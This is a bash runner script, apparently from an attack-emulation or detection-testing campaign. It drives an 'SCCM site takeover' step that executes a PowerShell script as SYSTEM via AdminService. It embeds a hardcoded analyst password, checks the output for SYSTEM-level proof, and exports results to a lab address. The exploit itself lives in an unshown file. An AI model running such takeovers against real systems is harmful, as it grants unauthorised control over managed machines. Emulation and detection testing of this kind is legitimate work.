#!/usr/bin/env bash
# T039 — SCCM script-as-SYSTEM via AdminService (validated WT039 path)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T039-SCCM-SITETAKEOVER-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T039 SCCM site takeover | ${CASE_ID} | T0=${T0} ==="

OUT="$(campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' sccm/ws01-wt039-rest.ps1)"
printf '%s\n' "${OUT}"
campaign_require_ok T039 "${OUT}" 'T039_OK|nt authority\\system|WT039-PROOF|ScriptOutput'
cadre_export "${CASE_ID}" T039 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T039 run complete ==="
